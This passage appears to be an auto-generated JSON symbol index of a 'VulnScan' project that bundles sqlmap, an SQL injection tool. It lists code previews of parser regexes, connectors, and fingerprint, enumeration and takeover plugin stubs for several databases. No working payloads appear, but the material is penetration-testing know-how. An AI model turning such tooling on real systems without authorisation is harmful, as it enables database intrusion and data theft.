        "peekOfCode": "entityref = re.compile('&([a-zA-Z][-.a-zA-Z0-9]*)[^a-zA-Z0-9]')\ncharref = re.compile('&#([0-9]+)[^0-9]')\nstarttagopen = re.compile('<[>a-zA-Z]')\nshorttagopen = re.compile('<[a-zA-Z][-.a-zA-Z0-9]*/')\nshorttag = re.compile('<([a-zA-Z][-.a-zA-Z0-9]*)/([^/]*)/')\npiclose = re.compile('>')\nendbracket = re.compile('[<>]')\ntagfind = re.compile('[a-zA-Z][-_.a-zA-Z0-9]*')\nattrfind = re.compile(\n    r'\\s*([a-zA-Z_][-:.a-zA-Z_0-9]*)(\\s*=\\s*'",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "documentation": {}
    },
    {
        "label": "charref",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "description": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "peekOfCode": "charref = re.compile('&#([0-9]+)[^0-9]')\nstarttagopen = re.compile('<[>a-zA-Z]')\nshorttagopen = re.compile('<[a-zA-Z][-.a-zA-Z0-9]*/')\nshorttag = re.compile('<([a-zA-Z][-.a-zA-Z0-9]*)/([^/]*)/')\npiclose = re.compile('>')\nendbracket = re.compile('[<>]')\ntagfind = re.compile('[a-zA-Z][-_.a-zA-Z0-9]*')\nattrfind = re.compile(\n    r'\\s*([a-zA-Z_][-:.a-zA-Z_0-9]*)(\\s*=\\s*'\n    r'(\\'[^\\']*\\'|\"[^\"]*\"|[][\\-a-zA-Z0-9./,:;+*%?!&$\\(\\)_#=~\\'\"@]*))?')",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "documentation": {}
    },
    {
        "label": "starttagopen",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "description": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "peekOfCode": "starttagopen = re.compile('<[>a-zA-Z]')\nshorttagopen = re.compile('<[a-zA-Z][-.a-zA-Z0-9]*/')\nshorttag = re.compile('<([a-zA-Z][-.a-zA-Z0-9]*)/([^/]*)/')\npiclose = re.compile('>')\nendbracket = re.compile('[<>]')\ntagfind = re.compile('[a-zA-Z][-_.a-zA-Z0-9]*')\nattrfind = re.compile(\n    r'\\s*([a-zA-Z_][-:.a-zA-Z_0-9]*)(\\s*=\\s*'\n    r'(\\'[^\\']*\\'|\"[^\"]*\"|[][\\-a-zA-Z0-9./,:;+*%?!&$\\(\\)_#=~\\'\"@]*))?')\nclass SGMLParseError(RuntimeError):",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "documentation": {}
    },
    {
        "label": "shorttagopen",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "description": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "peekOfCode": "shorttagopen = re.compile('<[a-zA-Z][-.a-zA-Z0-9]*/')\nshorttag = re.compile('<([a-zA-Z][-.a-zA-Z0-9]*)/([^/]*)/')\npiclose = re.compile('>')\nendbracket = re.compile('[<>]')\ntagfind = re.compile('[a-zA-Z][-_.a-zA-Z0-9]*')\nattrfind = re.compile(\n    r'\\s*([a-zA-Z_][-:.a-zA-Z_0-9]*)(\\s*=\\s*'\n    r'(\\'[^\\']*\\'|\"[^\"]*\"|[][\\-a-zA-Z0-9./,:;+*%?!&$\\(\\)_#=~\\'\"@]*))?')\nclass SGMLParseError(RuntimeError):\n    \"\"\"Exception raised for all parse errors.\"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "documentation": {}
    },
    {
        "label": "shorttag",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "description": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "peekOfCode": "shorttag = re.compile('<([a-zA-Z][-.a-zA-Z0-9]*)/([^/]*)/')\npiclose = re.compile('>')\nendbracket = re.compile('[<>]')\ntagfind = re.compile('[a-zA-Z][-_.a-zA-Z0-9]*')\nattrfind = re.compile(\n    r'\\s*([a-zA-Z_][-:.a-zA-Z_0-9]*)(\\s*=\\s*'\n    r'(\\'[^\\']*\\'|\"[^\"]*\"|[][\\-a-zA-Z0-9./,:;+*%?!&$\\(\\)_#=~\\'\"@]*))?')\nclass SGMLParseError(RuntimeError):\n    \"\"\"Exception raised for all parse errors.\"\"\"\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "documentation": {}
    },
    {
        "label": "piclose",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "description": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "peekOfCode": "piclose = re.compile('>')\nendbracket = re.compile('[<>]')\ntagfind = re.compile('[a-zA-Z][-_.a-zA-Z0-9]*')\nattrfind = re.compile(\n    r'\\s*([a-zA-Z_][-:.a-zA-Z_0-9]*)(\\s*=\\s*'\n    r'(\\'[^\\']*\\'|\"[^\"]*\"|[][\\-a-zA-Z0-9./,:;+*%?!&$\\(\\)_#=~\\'\"@]*))?')\nclass SGMLParseError(RuntimeError):\n    \"\"\"Exception raised for all parse errors.\"\"\"\n    pass\n# SGML parser base class -- find tags and call handler functions.",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "documentation": {}
    },
    {
        "label": "endbracket",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "description": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "peekOfCode": "endbracket = re.compile('[<>]')\ntagfind = re.compile('[a-zA-Z][-_.a-zA-Z0-9]*')\nattrfind = re.compile(\n    r'\\s*([a-zA-Z_][-:.a-zA-Z_0-9]*)(\\s*=\\s*'\n    r'(\\'[^\\']*\\'|\"[^\"]*\"|[][\\-a-zA-Z0-9./,:;+*%?!&$\\(\\)_#=~\\'\"@]*))?')\nclass SGMLParseError(RuntimeError):\n    \"\"\"Exception raised for all parse errors.\"\"\"\n    pass\n# SGML parser base class -- find tags and call handler functions.\n# Usage: p = SGMLParser(); p.feed(data); ...; p.close().",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "documentation": {}
    },
    {
        "label": "tagfind",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "description": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "peekOfCode": "tagfind = re.compile('[a-zA-Z][-_.a-zA-Z0-9]*')\nattrfind = re.compile(\n    r'\\s*([a-zA-Z_][-:.a-zA-Z_0-9]*)(\\s*=\\s*'\n    r'(\\'[^\\']*\\'|\"[^\"]*\"|[][\\-a-zA-Z0-9./,:;+*%?!&$\\(\\)_#=~\\'\"@]*))?')\nclass SGMLParseError(RuntimeError):\n    \"\"\"Exception raised for all parse errors.\"\"\"\n    pass\n# SGML parser base class -- find tags and call handler functions.\n# Usage: p = SGMLParser(); p.feed(data); ...; p.close().\n# The dtd is defined by deriving a class which defines methods",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "documentation": {}
    },
    {
        "label": "attrfind",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "description": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "peekOfCode": "attrfind = re.compile(\n    r'\\s*([a-zA-Z_][-:.a-zA-Z_0-9]*)(\\s*=\\s*'\n    r'(\\'[^\\']*\\'|\"[^\"]*\"|[][\\-a-zA-Z0-9./,:;+*%?!&$\\(\\)_#=~\\'\"@]*))?')\nclass SGMLParseError(RuntimeError):\n    \"\"\"Exception raised for all parse errors.\"\"\"\n    pass\n# SGML parser base class -- find tags and call handler functions.\n# Usage: p = SGMLParser(); p.feed(data); ...; p.close().\n# The dtd is defined by deriving a class which defines methods\n# with special names to handle tags: start_foo and end_foo to handle",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sgmllib",
        "documentation": {}
    },
    {
        "label": "SQLAlchemy",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sqlalchemy",
        "description": "VulnScan.modules.sqlmap.lib.utils.sqlalchemy",
        "peekOfCode": "class SQLAlchemy(GenericConnector):\n    def __init__(self, dialect=None):\n        GenericConnector.__init__(self)\n        self.dialect = dialect\n        self.address = conf.direct\n        if self.dialect:\n            self.address = re.sub(r\"\\A.+://\", \"%s://\" % self.dialect, self.address)\n    def connect(self):\n        if _sqlalchemy:\n            self.initConnection()",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sqlalchemy",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sqlalchemy",
        "description": "VulnScan.modules.sqlmap.lib.utils.sqlalchemy",
        "peekOfCode": "def getSafeExString(ex, encoding=None):  # Cross-referenced function\n    raise NotImplementedError\nclass SQLAlchemy(GenericConnector):\n    def __init__(self, dialect=None):\n        GenericConnector.__init__(self)\n        self.dialect = dialect\n        self.address = conf.direct\n        if self.dialect:\n            self.address = re.sub(r\"\\A.+://\", \"%s://\" % self.dialect, self.address)\n    def connect(self):",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sqlalchemy",
        "documentation": {}
    },
    {
        "label": "_path",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sqlalchemy",
        "description": "VulnScan.modules.sqlmap.lib.utils.sqlalchemy",
        "peekOfCode": "_path = list(sys.path)\n_sqlalchemy = None\ntry:\n    sys.path = sys.path[1:]\n    module = importlib.import_module(\"sqlalchemy\")\n    if hasattr(module, \"dialects\"):\n        _sqlalchemy = module\n        warnings.simplefilter(action=\"ignore\", category=_sqlalchemy.exc.SAWarning)\nexcept ImportError:\n    pass",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sqlalchemy",
        "documentation": {}
    },
    {
        "label": "_sqlalchemy",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.sqlalchemy",
        "description": "VulnScan.modules.sqlmap.lib.utils.sqlalchemy",
        "peekOfCode": "_sqlalchemy = None\ntry:\n    sys.path = sys.path[1:]\n    module = importlib.import_module(\"sqlalchemy\")\n    if hasattr(module, \"dialects\"):\n        _sqlalchemy = module\n        warnings.simplefilter(action=\"ignore\", category=_sqlalchemy.exc.SAWarning)\nexcept ImportError:\n    pass\nfinally:",
        "detail": "VulnScan.modules.sqlmap.lib.utils.sqlalchemy",
        "documentation": {}
    },
    {
        "label": "timeout",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.timeout",
        "description": "VulnScan.modules.sqlmap.lib.utils.timeout",
        "peekOfCode": "def timeout(func, args=None, kwargs=None, duration=1, default=None):\n    class InterruptableThread(threading.Thread):\n        def __init__(self):\n            threading.Thread.__init__(self)\n            self.result = None\n            self.timeout_state = None\n        def run(self):\n            try:\n                self.result = func(*(args or ()), **(kwargs or {}))\n                self.timeout_state = TIMEOUT_STATE.NORMAL",
        "detail": "VulnScan.modules.sqlmap.lib.utils.timeout",
        "documentation": {}
    },
    {
        "label": "PYVERSION",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.versioncheck",
        "description": "VulnScan.modules.sqlmap.lib.utils.versioncheck",
        "peekOfCode": "PYVERSION = sys.version.split()[0]\nif PYVERSION < \"2.6\":\n    sys.exit(\"[%s] [CRITICAL] incompatible Python version detected ('%s'). To successfully run sqlmap you'll have to use version 2.6, 2.7 or 3.x (visit 'https://www.python.org/downloads/')\" % (time.strftime(\"%X\"), PYVERSION))\nerrors = []\nextensions = (\"bz2\", \"gzip\", \"pyexpat\", \"ssl\", \"sqlite3\", \"zlib\")\nfor _ in extensions:\n    try:\n        __import__(_)\n    except ImportError:\n        errors.append(_)",
        "detail": "VulnScan.modules.sqlmap.lib.utils.versioncheck",
        "documentation": {}
    },
    {
        "label": "errors",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.versioncheck",
        "description": "VulnScan.modules.sqlmap.lib.utils.versioncheck",
        "peekOfCode": "errors = []\nextensions = (\"bz2\", \"gzip\", \"pyexpat\", \"ssl\", \"sqlite3\", \"zlib\")\nfor _ in extensions:\n    try:\n        __import__(_)\n    except ImportError:\n        errors.append(_)\nif errors:\n    errMsg = \"[%s] [CRITICAL] missing one or more core extensions (%s) \" % (time.strftime(\"%X\"), \", \".join(\"'%s'\" % _ for _ in errors))\n    errMsg += \"most likely because current version of Python has been \"",
        "detail": "VulnScan.modules.sqlmap.lib.utils.versioncheck",
        "documentation": {}
    },
    {
        "label": "extensions",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.versioncheck",
        "description": "VulnScan.modules.sqlmap.lib.utils.versioncheck",
        "peekOfCode": "extensions = (\"bz2\", \"gzip\", \"pyexpat\", \"ssl\", \"sqlite3\", \"zlib\")\nfor _ in extensions:\n    try:\n        __import__(_)\n    except ImportError:\n        errors.append(_)\nif errors:\n    errMsg = \"[%s] [CRITICAL] missing one or more core extensions (%s) \" % (time.strftime(\"%X\"), \", \".join(\"'%s'\" % _ for _ in errors))\n    errMsg += \"most likely because current version of Python has been \"\n    errMsg += \"built without appropriate dev packages\"",
        "detail": "VulnScan.modules.sqlmap.lib.utils.versioncheck",
        "documentation": {}
    },
    {
        "label": "xrange",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.xrange",
        "description": "VulnScan.modules.sqlmap.lib.utils.xrange",
        "peekOfCode": "class xrange(object):\n    \"\"\"\n    Advanced (re)implementation of xrange (supports slice/copy/etc.)\n    Reference: http://code.activestate.com/recipes/521885-a-pythonic-implementation-of-xrange/\n    >>> list(xrange(1, 9)) == list(range(1, 9))\n    True\n    >>> list(xrange(8, 0, -16)) == list(range(8, 0, -16))\n    True\n    >>> list(xrange(0, 8, 16)) == list(range(0, 8, 16))\n    True",
        "detail": "VulnScan.modules.sqlmap.lib.utils.xrange",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.access.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.access.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://github.com/mkleehammer/pyodbc\n    User guide: https://github.com/mkleehammer/pyodbc/wiki\n    Debian package: python-pyodbc\n    License: MIT\n    \"\"\"\n    def connect(self):\n        if not IS_WIN:\n            errMsg = \"currently, direct connection to Microsoft Access database(s) \"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.access.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.access.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.access.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getBanner(self):\n        warnMsg = \"on Microsoft Access it is not possible to get the banner\"\n        logger.warning(warnMsg)\n        return None\n    def getCurrentUser(self):\n        warnMsg = \"on Microsoft Access it is not possible to enumerate the current user\"\n        logger.warning(warnMsg)\n    def getCurrentDb(self):\n        warnMsg = \"on Microsoft Access it is not possible to get name of the current database\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.access.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.access.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.access.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on Microsoft Access it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on Microsoft Access it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.access.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.access.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.access.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.ACCESS)\n    def _sandBoxCheck(self):\n        # Reference: http://milw0rm.com/papers/198\n        retVal = None\n        table = None\n        if Backend.isVersionWithin((\"97\", \"2000\")):\n            table = \"MSysAccessObjects\"\n        elif Backend.isVersionWithin((\"2002-2003\", \"2007\")):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.access.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.access.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.access.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHR(97)&CHR(98)&CHR(99)&CHR(100)&CHR(101)&CHR(102)&CHR(103)&CHR(104) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):\n            return \"&\".join(\"CHR(%d)\" % _ for _ in getOrds(value))\n        return Syntax._escape(expression, quote, escaper)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.access.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.access.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.access.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Microsoft Access it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on Microsoft Access it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on Microsoft Access it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.access.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.altibase.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.altibase.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    def connect(self):\n        errMsg = \"on Altibase it is not (currently) possible to establish a \"\n        errMsg += \"direct connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.altibase.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.altibase.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.altibase.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getStatements(self):\n        warnMsg = \"on Altibase it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n        return []\n    def getHostname(self):\n        warnMsg = \"on Altibase it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.altibase.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.altibase.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.altibase.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    pass",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.altibase.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.altibase.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.altibase.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.ALTIBASE)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.altibase.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.altibase.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.altibase.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHR(97)||CHR(98)||CHR(99)||CHR(100)||CHR(101)||CHR(102)||CHR(103)||CHR(104) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):\n            return \"||\".join(\"CHR(%d)\" % _ for _ in getOrds(value))\n        return Syntax._escape(expression, quote, escaper)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.altibase.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.altibase.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.altibase.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Altibase it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on Altibase it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on Altibase it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.altibase.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.cache.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.cache.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://pypi.python.org/pypi/JayDeBeApi/ & http://jpype.sourceforge.net/\n    User guide: https://pypi.python.org/pypi/JayDeBeApi/#usage & http://jpype.sourceforge.net/doc/user-guide/userguide.html\n    API: -\n    Debian package: -\n    License: LGPL & Apache License 2.0\n    \"\"\"\n    def connect(self):\n        self.initConnection()",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.cache.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.cache.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.cache.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getCurrentDb(self):\n        return CACHE_DEFAULT_SCHEMA\n    def getUsers(self):\n        warnMsg = \"on Cache it is not possible to enumerate the users\"\n        logger.warning(warnMsg)\n        return []\n    def getPasswordHashes(self):\n        warnMsg = \"on Cache it is not possible to enumerate password hashes\"\n        logger.warning(warnMsg)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.cache.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.cache.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.cache.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    pass",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.cache.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.cache.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.cache.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.CACHE)\n    def getFingerprint(self):\n        fork = hashDBRetrieve(HASHDB_KEYS.DBMS_FORK)\n        if fork is None:\n            if inject.checkBooleanExpression(\"$ZVERSION LIKE '%IRIS%'\"):\n                fork = FORK.IRIS\n            else:\n                fork = \"\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.cache.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.cache.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.cache.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> from lib.core.common import Backend\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHAR(97)||CHAR(98)||CHAR(99)||CHAR(100)||CHAR(101)||CHAR(102)||CHAR(103)||CHAR(104) FROM foobar\"\n        True\n        \"\"\"\n        def escaper(value):\n            return \"||\".join(\"CHAR(%d)\" % _ for _ in getOrds(value))",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.cache.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.cache.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.cache.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Cache it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on Cache it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on Cache it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.cache.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.cratedb.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.cratedb.connector",
        "peekOfCode": "class Connector(GenericConnector):\n    \"\"\"\n    Homepage: http://initd.org/psycopg/\n    User guide: http://initd.org/psycopg/docs/\n    API: http://initd.org/psycopg/docs/genindex.html\n    Debian package: python-psycopg2\n    License: GPL\n    Possible connectors: http://wiki.python.org/moin/PostgreSQL\n    \"\"\"\n    def connect(self):",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.cratedb.connector",
        "documentation": {}
    },
    {
        "label": "Enumeration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.cratedb.enumeration",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.cratedb.enumeration",
        "peekOfCode": "class Enumeration(GenericEnumeration):\n    def getPasswordHashes(self):\n        warnMsg = \"on CrateDB it is not possible to enumerate the user password hashes\"\n        logger.warning(warnMsg)\n        return {}\n    def getRoles(self, *args, **kwargs):\n        warnMsg = \"on CrateDB it is not possible to enumerate the user roles\"\n        logger.warning(warnMsg)\n        return {}",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.cratedb.enumeration",
        "documentation": {}
    },
    {
        "label": "Filesystem",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.cratedb.filesystem",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.cratedb.filesystem",
        "peekOfCode": "class Filesystem(GenericFilesystem):\n    pass",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.cratedb.filesystem",
        "documentation": {}
    },
    {
        "label": "Fingerprint",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.cratedb.fingerprint",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.cratedb.fingerprint",
        "peekOfCode": "class Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.CRATEDB)\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.cratedb.fingerprint",
        "documentation": {}
    },
    {
        "label": "Syntax",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.cratedb.syntax",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.cratedb.syntax",
        "peekOfCode": "class Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT 'abcdefgh' FROM foobar\"\n        True\n        \"\"\"\n        return expression",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.cratedb.syntax",
        "documentation": {}
    },
    {
        "label": "Takeover",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.cratedb.takeover",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.cratedb.takeover",
        "peekOfCode": "class Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on CrateDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osShell(self):\n        errMsg = \"on CrateDB it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n    def osPwn(self):\n        errMsg = \"on CrateDB it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"",
        "detail": "VulnScan.modules.sqlmap.plugins.dbms.cratedb.takeover",
        "documentation": {}
    },
    {
        "label": "Connector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.plugins.dbms.cubrid.connector",
        "description": "VulnScan.modules.sqlmap.plugins.dbms.cubrid.connector",
